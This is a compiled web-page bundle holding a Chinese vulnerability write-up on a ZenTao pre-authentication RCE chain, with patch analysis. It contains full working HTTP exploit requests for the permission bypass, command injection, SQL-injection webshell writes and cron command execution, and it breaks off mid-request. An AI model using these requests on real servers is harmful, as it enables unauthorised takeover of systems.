import{_ as p,r as o,o as i,c,b as e,d as a,a as d,e as s}from"./app-vMCaIZpZ.js";const r="/assets/Pasted_image_20230615110230-F_9uvPDu.png",l="/assets/Pasted_image_20230130141205-56UiBXW0.png",h="/assets/Pasted_image_20230130141829-a3MBkuh9.png",u="/assets/Pasted_image_20230130145331-XUIgTlTw.png",m="/assets/Pasted_image_20230130152525-Ozbmh4tw.png",k="/assets/Pasted_image_20230130154225-D77D5P_e.png",v="/assets/Pasted_image_20230130155041-NIvIsEpB.png",g="/assets/Pasted_image_20230130155429-1j6meHUg.png",b="/assets/Pasted_image_20230130155807-r8y1y6qP.png",_="/assets/Pasted_image_20230131101420-2HMPq_P7.png",w="/assets/Pasted_image_20230203105702-yVXkLyS2.png",y="/assets/Pasted_image_20230130174842-WEpdtWll.png",x="/assets/Pasted_image_20230131092726-KP3faHrq.png",f="/assets/Pasted_image_20230131094239-IMUU1AY9.png",P="/assets/Pasted_image_20230131094610-ypSxbTVt.png",C="/assets/Pasted_image_20230131095211-4iepK7Ox.png",z="/assets/Pasted_image_20230131095934--UxpgPng.png",T="/assets/Pasted_image_20230131100940-li-ZAfCB.png",q="/assets/Pasted_image_20230202113510-HqphH1vS.png",H="/assets/Pasted_image_20230202173440-u5Uw-7Ug.png",O="/assets/Pasted_image_20230202173446-eApLfFJc.png",L="/assets/Pasted_image_20230131104414-MQLT5Xnq.png",S="/assets/Pasted_image_20230131104611-Eudv7UsI.png",E="/assets/Pasted_image_20230131103302-zUoP61gU.png",N="/assets/Pasted_image_20230131110046-hLl1XIGW.png",R="/assets/Pasted_image_20230131111643-kVLi_Pbb.png",I="/assets/Pasted_image_20230131111623-CBtjdFLg.png",Q="/assets/Pasted_image_20230131121922-ECmTlspA.png",U="/assets/Pasted_image_20230131122035-9bxPQLo1.png",A="/assets/Pasted_image_20230131162716-ucn6e1Ec.png",M="/assets/企业微信截图_acd510d4-ce35-4dd7-b530-2726cc4d2c74-cWKAT-LG.png",$="/assets/Pasted_image_20230131161859-_Hpy9inz.png",F="/assets/Pasted_image_20230202173903-_qNFrCce.png",W="/assets/Pasted_image_20230131142033-sf_ZtCPJ.png",X="/assets/Pasted_image_20230131141328-7DYs8vSN.png",D="/assets/Pasted_image_20230203131849-gHcziQtN.png",V="/assets/Pasted_image_20230203131724-Yyrv6ygE.png",j="/assets/Pasted_image_20230131141230-EQ0bEKwh.png",Z="/assets/Pasted_image_20230131141213-i7e9hCY4.png",B="/assets/Pasted_image_20230131141523-sf0_o1F3.png",n="/assets/Pasted_image_20230131141551-VTtyO95M.png",G="/assets/Pasted_image_20230131141714-hoOmzU2t.png",K="/assets/Pasted_image_20230131141735-0eix4-Zo.png",Y="/assets/Pasted_image_20230131171408-lk7PdV_n.png",J="/assets/Pasted_image_20230131101640-Sfi5Cjsz.png",aa="/assets/Pasted_image_20230131102156-lHJRDQu9.png",ea="/assets/Pasted_image_20230131122511-g8kDkr0N.png",sa="/assets/Pasted_image_20230131122646-OQIPtlsT.png",na="/assets/Pasted_image_20230201141331-3aFt0ral.png",ta="/assets/Pasted_image_20230131131112-emoj4eZJ.png",pa="/assets/Pasted_image_20230131131151-MOXDaclr.png",oa="/assets/Pasted_image_20230131131524-wsZwo7XL.png",ia="/assets/Pasted_image_20230210142542-5hQCfYAU.png",ca="/assets/Pasted_image_20230618153941-vh3NH2XM.png",da="/assets/Pasted_image_20230618154129-KHl317Hp.png",ra={},la=s(`<h1 id="zentao-禅道前台权限绕过rce分析-2022-12-19" tabindex="-1"><a class="header-anchor" href="#zentao-禅道前台权限绕过rce分析-2022-12-19" aria-hidden="true">#</a> zentao 禅道前台权限绕过RCE分析（2022 12 19 ）</h1><h2 id="漏洞介绍" tabindex="-1"><a class="header-anchor" href="#漏洞介绍" aria-hidden="true">#</a> 漏洞介绍</h2><p>禅道是第一款国产的开源项目管理软件，也是国内最流行的项目管理软件。 该系统在2023年初被爆出在野命令执行漏洞，官方已于2023年1月12日发布了漏洞修复补丁。该漏洞是由于禅道项目管理系统权限认证存在缺陷导致，攻击者可利用该漏洞在未授权的情况下，通过权限绕过在服务器执行任意命令。</p><p>这个漏洞核心是前台的权限绕过漏洞，效果是可以任意访问后台的接口 然后配合后台的sql注入或命令注入来实现RCE</p><h2 id="影响版本" tabindex="-1"><a class="header-anchor" href="#影响版本" aria-hidden="true">#</a> 影响版本</h2><p>17.4&lt;=version&lt;=18.0.beta1（开源版） 3.4&lt;=version&lt;=4.0.beta1（pro 旗舰版） 7.4&lt;=version&lt;=8.0.beta1（biz 企业版）</p><p>经测试，16.4存在权限绕过，但是无法直接执行命令</p><h2 id="漏洞环境搭建" tabindex="-1"><a class="header-anchor" href="#漏洞环境搭建" aria-hidden="true">#</a> 漏洞环境搭建</h2><p>安装很简单，类似于phpstudy一键安装和启动。</p><p>开源漏洞版本 18.0 beta1 一键安装包下载： https://www.zentao.net/download/zentaopms18.0.beta1-81862.html</p><p>linux docker：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">## 开源版</span>
<span class="token function">docker</span> pull easysoft/zentao:18.0.beta1


<span class="token comment">## 数据库连接密码默认为123456</span>
<span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> zentao <span class="token parameter variable">-p</span> <span class="token number">10011</span>:80 <span class="token parameter variable">-v</span> /docker/zentao/www/zentaopms:/www/zentaopms <span class="token parameter variable">-v</span> /docker/zentao/www/mysqldata:/var/lib/mysql easysoft/zentao:biz8.0.beta1



<span class="token comment">## 企业版</span>
<span class="token function">docker</span> pull easysoft/zentao:biz8.0.beta1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>本次漏洞复现主要用到了Windows一键安装包，和linux docker的开源版本 均为18.0 beta1</p><p>web根目录为</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>C:\\xampp\\zentao\\www
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+r+'" alt=""></p><h2 id="漏洞一-权限绕过漏洞" tabindex="-1"><a class="header-anchor" href="#漏洞一-权限绕过漏洞" aria-hidden="true">#</a> 漏洞一：权限绕过漏洞</h2><h3 id="权限绕过漏洞分析-2022年12月14日" tabindex="-1"><a class="header-anchor" href="#权限绕过漏洞分析-2022年12月14日" aria-hidden="true">#</a> 权限绕过漏洞分析（2022年12月14日）</h3><p>漏洞点在 module/common/model.php checkPriv() 中 <img src="'+l+`" alt=""> 修复前只是echo一个提示权限不足的报错信息 修复后是调用die函数退出脚本执行</p><p>这个权限绕过还是挺有意思的，因为没有及时退出脚本导致的权限绕过。</p><p>这个检查权限是在index.php中直接被调用的 index.php中有以下三个比较核心的功能：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$app</span><span class="token operator">-&gt;</span><span class="token function">parseRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 解析请求，设置模块、方法</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$app</span><span class="token operator">-&gt;</span><span class="token function">setParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>  
<span class="token variable">$common</span><span class="token operator">-&gt;</span><span class="token function">checkPriv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 检查Module、Method的权限</span>
<span class="token variable">$common</span><span class="token operator">-&gt;</span><span class="token function">checkIframe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$app</span><span class="token operator">-&gt;</span><span class="token function">loadModule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 加载模块，调用方法</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果检查权限后没有退出脚本，将会继续向下执行并进行模块调用。 <img src="`+h+'" alt=""></p><p>可以看到以上漏洞点在catch代码块中，捕获了EndResponseException异常 以这个为切入点，如果想走到这个逻辑，需要找到看哪个地方在抛EndResponseException异常</p><p>这里有点不太好找，可以尝试动态调试下断点。 <img src="'+u+`" alt=""></p><p>这里直接看别人的分析，可知抛异常的调用如下</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">deny</span><span class="token punctuation">(</span><span class="token variable">$module</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name static-context">helper</span><span class="token operator">::</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+m+'" alt=""></p><p>继续向上回溯，发现有一个if条件<code>isset($this-&gt;app-&gt;user)</code>需要解决，问题来了，如何设置<code>$this-&gt;app-&gt;user</code>，使得满足条件？</p><h3 id="如何设置-this-app-user" tabindex="-1"><a class="header-anchor" href="#如何设置-this-app-user" aria-hidden="true">#</a> 如何设置<code>$this-&gt;app-user </code></h3><p>module/common/model.php 在common模块中的setUser方法中，有一个通过session来设置<code>$this-&gt;app-&gt;user</code>的赋值操作 <img src="'+k+'" alt=""></p><p>这个调用逻辑如下，调用的开头就是index文件中的加载common模块的loadCommon()方法，所以这个调用逻辑是每次访问都会触发的 <img src="'+v+'" alt=""> 即，问题转换为如何控制设置session中的user变量，从而来修改<code>$this-&gt;app-&gt;user</code>变量</p><h3 id="如何控制session中的user变量" tabindex="-1"><a class="header-anchor" href="#如何控制session中的user变量" aria-hidden="true">#</a> 如何控制session中的user变量</h3><p>module/misc/control.php#captcha() 在这里找到了一个可以在session数组中设置任意对象的方法 <img src="'+g+'" alt=""></p><p>并且这个方法还是可以前台未授权访问的，因为 module/common/model.php#isOpenMethod() 这里定义了无需权限的公开方法</p><p>名单大部分都在<code>$this-&gt;config-&gt;openMethods</code>中，其中就有我们需要的misc模块中的captcha方法：</p><p><img src="'+b+'" alt=""></p><h3 id="权限绕过漏洞逻辑总结" tabindex="-1"><a class="header-anchor" href="#权限绕过漏洞逻辑总结" aria-hidden="true">#</a> 权限绕过漏洞逻辑总结</h3><p>这样就形成的一个完整的权限绕过的漏洞利用链条：</p><p>首先访问misc模块的captcha方法，并传入user参数，使得session中的user对象不为null</p><p>之后就可以任意访问你想要访问的的后台接口了，因为在任意访问的时候就会把session中的user对象赋值给全局<code>$app</code>对象中的user。这样就能通过<code>isset($this-&gt;app-&gt;user)</code>的判断，走进if逻辑中接着通过一系列调用链，来抛出EndResponseException异常，紧接着被catch捕获该异常，没有执行die函数，从而绕过权限校验</p><h3 id="权限绕过漏洞poc" tabindex="-1"><a class="header-anchor" href="#权限绕过漏洞poc" aria-hidden="true">#</a> 权限绕过漏洞POC</h3><p>misc模块captcha方法，可以通过misc-captcha-user来直接前台访问，返回的cookie就可以进行权限绕过访问后台的接口 http://10.211.55.7/zentao/misc-captcha-user</p><p><img src="'+_+'" alt=""></p><h3 id="补丁二-2022年1月13日" tabindex="-1"><a class="header-anchor" href="#补丁二-2022年1月13日" aria-hidden="true">#</a> 补丁二（2022年1月13日）</h3><p>额外增加了一个校验，防止传入user参数 <img src="'+w+'" alt=""></p><h3 id="path-info路由" tabindex="-1"><a class="header-anchor" href="#path-info路由" aria-hidden="true">#</a> PATH_INFO路由</h3><p>m=misc&amp;f=captcha&amp;sessionVar=user</p><h2 id="漏洞二-后台命令注入漏洞" tabindex="-1"><a class="header-anchor" href="#漏洞二-后台命令注入漏洞" aria-hidden="true">#</a> 漏洞二：后台命令注入漏洞</h2><h3 id="后台命令注入漏洞分析" tabindex="-1"><a class="header-anchor" href="#后台命令注入漏洞分析" aria-hidden="true">#</a> 后台命令注入漏洞分析</h3><p>module/repo/model.php#checkConnection <img src="'+y+'" alt=""> 这里取post中的client变量，直接拼接在命令执行中，造成命令注入。</p><p>其他这里面三个逻辑都有命令注入的地方，但是其他两个漏洞触发点需要额外条件，没有第一个的实用。 <img src="'+x+'" alt=""></p><p>这个函数可以确定存在漏洞了，之后需要看看哪里调用了这个漏洞函数。</p><p>搜索结果如下： <img src="'+f+'" alt=""></p><h3 id="checkclient-校验分析" tabindex="-1"><a class="header-anchor" href="#checkclient-校验分析" aria-hidden="true">#</a> checkClient() 校验分析</h3><p>create函数中调用了该函数，但是实际上是走不通的，因为在调用漏洞函数checkConnction之前调用了checkClient函数</p><p>想要让checkClient返回为true，需要满足以下三个条件之一</p><ol><li>scm为Gitlab</li><li>配置中的 config-&gt;features-&gt;checkClient 为false</li><li>存在<code>$clientVersionFile</code>文件（需要自行创建） <img src="'+P+'" alt=""></li><li>第一个条件与咱们之前分析的条件相违背，无法在一个请求中做到scm同时为Gitlab和Subversion</li><li>第二个条件默认为true，也无法满足条件</li><li>第三个条件也需要我们找到一个创建任意文件漏洞来创建文件 除了第三个条件还有点希望，其他条件基本就凉了。</li></ol><h3 id="update函数中调用checkconnection分析" tabindex="-1"><a class="header-anchor" href="#update函数中调用checkconnection分析" aria-hidden="true">#</a> update函数中调用checkConnection分析</h3><p>module/repo/model.php#update</p><p>update中有两处调用checkConnection，但是我们只用分析开头第一个就行 <img src="'+C+'" alt=""> 看到直接就可以调用漏洞函数，继续向上寻找哪里调用了这个函数</p><p>repo模块下的model.php函数，需要我们在control.php文件下搜索<code>$this-&gt;repo-&gt;update</code>即可搜索到，仅此一处调用 <img src="'+z+`" alt=""> repo模块control.php文件中的edit函数，可以直接在web中通过<code>repo-edit-repoID</code>的形式去触发 至此达成攻击链</p><h3 id="后台命令注入漏洞poc" tabindex="-1"><a class="header-anchor" href="#后台命令注入漏洞poc" aria-hidden="true">#</a> 后台命令注入漏洞POC</h3><p>⚠️⚠️⚠️注意禅道在这个地方有Referer校验，不要忘记，否则无法执行</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/repo-edit-1231231</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=503b81e75aa5a88e6a85f0c74ea9de6b; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">53</span></span>

SCM=Subversion&amp;client=mkdir+C%3A%5C1success%26&amp;path=1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+T+'" alt=""> 该后台命令注入漏洞搭配之前的权限绕过，即可达成前台RCE</p><h3 id="补丁分析-2023年1月10日" tabindex="-1"><a class="header-anchor" href="#补丁分析-2023年1月10日" aria-hidden="true">#</a> 补丁分析（2023年1月10日）</h3><p>在之前加了一层client和一层checkClient()校验 <img src="'+q+'" alt=""> 我们只需要让post请求的client参数与<code>$repo-&gt;client</code>保持一致即可绕过校验。</p><p><img src="'+H+'" alt=""></p><p>但是发现默认为空，而且没有找到赋值的地方，所以我们需要过checkClient()的校验 <img src="'+O+'" alt=""></p><h3 id="path-info-路由" tabindex="-1"><a class="header-anchor" href="#path-info-路由" aria-hidden="true">#</a> PATH_INFO 路由</h3><p>m=repo&amp;f=edit&amp;repoID=1231231</p><h2 id="漏洞三-后台sql注入漏洞" tabindex="-1"><a class="header-anchor" href="#漏洞三-后台sql注入漏洞" aria-hidden="true">#</a> 漏洞三：后台SQL注入漏洞</h2><h3 id="后台sql注入漏洞分析" tabindex="-1"><a class="header-anchor" href="#后台sql注入漏洞分析" aria-hidden="true">#</a> 后台SQL注入漏洞分析</h3><p>漏洞点：module/convert/control.php#importNotice dbName可控，传入到了dbExists函数中，造成了SQL注入。</p><p><img src="'+L+`" alt=""></p><p>可以通过报错看到使用了PDO，PDO默认支持多语句执行，且可以通过报错知道绝对路径</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/convert-importNotice-db</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=cfe3137dc366322f419b19b06e65fc3e; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">8</span></span>

dbName=&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+S+'" alt=""></p><p>禅道默认用的是root权限，也没有写文件限制 <img src="'+E+`" alt=""></p><p>所以综合以上，这里的SQL注入可以通过任意SQL语句执行来写任意文件，从而写入Shell</p><h3 id="sql注入写入文件" tabindex="-1"><a class="header-anchor" href="#sql注入写入文件" aria-hidden="true">#</a> SQL注入写入文件</h3><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/convert-importNotice-db</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=cfe3137dc366322f419b19b06e65fc3e; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">96</span></span>

dbName=a&#39;;select 0x3c3f70687020706870696e666f28293b INTO OUTFILE &#39;C:/xampp/zentao/www/1.php&#39;;--a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+N+'" alt=""></p><p>可惜在本测试环境18.0 beta1版本中，发现windows和linux中的nginx都有限制，php文件无法解析。 windows： <img src="'+R+'" alt=""> linux： <img src="'+I+'" alt=""> 但是仍然有其他姿势可以绕过此限制。</p><h3 id="windows-白名单绕过php文件解析限制-exp" tabindex="-1"><a class="header-anchor" href="#windows-白名单绕过php文件解析限制-exp" aria-hidden="true">#</a> Windows 白名单绕过PHP文件解析限制 EXP</h3><blockquote><p>这个适用于高版本的禅道，低版本可能没有白名单。</p></blockquote><p>在nginx配置文件中找到相关设置，发现存在可以进行PHP解析的白名单文件名 <img src="'+Q+'" alt=""> 以下为禅道默认在www目录下存在的文件 <img src="'+U+'" alt=""> 经过对比后发现缺少upgrade.php、install.php、upgradexuanxuan.php，利用白名单即可绕过</p><p>不推荐上传install.php 和 upgrade.php文件，虽然可以执行我们的php文件，但是影响了正常网站运行 <img src="'+A+`" alt=""></p><p>上传upgradexuanxuan.php文件，即可执行</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/convert-importNotice-db</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=2d58e1e4397f949aac19d662d0ad8f9b; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">94</span></span>

dbName=a&#39;;select &#39;&lt;?php phpinfo();&#39; INTO OUTFILE &#39;C:/xampp/zentao/www/upgradexuanxuan.php&#39;;--a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+M+`" alt=""> 这里注意一下，SQL任意写文件无法覆盖文件，所以该Shell只能写一次，要谨慎。</p><h3 id="linux-绕过php文件解析-exp" tabindex="-1"><a class="header-anchor" href="#linux-绕过php文件解析-exp" aria-hidden="true">#</a> Linux 绕过PHP文件解析 EXP</h3><p>如果是Linux的话，可以利用大小写绕过黑名单检测，文件名随意，后缀为phP即可 上传一个 x.phP 文件，然后访问</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/convert-importNotice-db</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">xxx</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=6f5ff7e33da0ec74e8299a324a4d205e; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://xxxx这里需要修改和host一致</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">103</span></span>

dbName=a&#39;;select 0x3c3f70687020706870696e666f28293b INTO OUTFILE &#39;/opt/zbox/app/zentao/www/x.phP&#39;;--a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+$+'" alt=""></p><h3 id="补丁-2022年12月14日" tabindex="-1"><a class="header-anchor" href="#补丁-2022年12月14日" aria-hidden="true">#</a> 补丁（2022年12月14日）</h3><p>修复SQL注入 <img src="'+F+'" alt=""></p><h3 id="path-info路由-1" tabindex="-1"><a class="header-anchor" href="#path-info路由-1" aria-hidden="true">#</a> PATH_INFO路由</h3><p>m=convert&amp;f=importNotice&amp;method=db</p><h2 id="漏洞四-后台计划任务命令执行漏洞-需配合sql注入漏洞" tabindex="-1"><a class="header-anchor" href="#漏洞四-后台计划任务命令执行漏洞-需配合sql注入漏洞" aria-hidden="true">#</a> 漏洞四：后台计划任务命令执行漏洞（需配合SQL注入漏洞）</h2><h3 id="后台计划任务命令执行漏洞分析" tabindex="-1"><a class="header-anchor" href="#后台计划任务命令执行漏洞分析" aria-hidden="true">#</a> 后台计划任务命令执行漏洞分析</h3><p>触发点如下 module/cron/control.php#ajaxExec <img src="'+W+'" alt=""> 这个函数的大致流程为：从zt_cron表中获取状态不为stop的的记录，如果type为system，则执行命令</p><p>但是从正常接口创建系统类型的计划任务是会报错的 <img src="'+X+'" alt=""></p><p>因为默认关闭了cronSystemCall <img src="'+D+'" alt=""><img src="'+V+`" alt=""></p><p>所以我们可以先创建普通的zentao类型，然后利用上面的SQL注入漏洞修改type为system</p><h3 id="第一步-创建定时任务" tabindex="-1"><a class="header-anchor" href="#第一步-创建定时任务" aria-hidden="true">#</a> 第一步：创建定时任务</h3><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/cron-create</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=5593fa11a691d930bbd724f73f89f73a; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">76</span></span>

m=*%2F1&amp;h=*&amp;dom=*&amp;mon=*&amp;dow=*&amp;command=mkdir C:\\1234&amp;remark=test1&amp;type=zentao
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+j+'" alt=""></p><p>创建成功 <img src="'+Z+`" alt=""></p><h3 id="第二步-利用sql注入修改type为system" tabindex="-1"><a class="header-anchor" href="#第二步-利用sql注入修改type为system" aria-hidden="true">#</a> 第二步：利用SQL注入修改type为system</h3><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/convert-importNotice-db</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=befa50fda3f7c140894bded410551624; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">67</span></span>

dbName=a&#39;;update zt_cron set type=&#39;system&#39; where remark=&#39;test1&#39;;--a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+B+'" alt=""></p><p><img src="'+n+`" alt=""></p><h3 id="第三步-执行触发命令" tabindex="-1"><a class="header-anchor" href="#第三步-执行触发命令" aria-hidden="true">#</a> 第三步：执行触发命令</h3><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/convert-ajaxExec-0</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=befa50fda3f7c140894bded410551624; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">0</span></span>
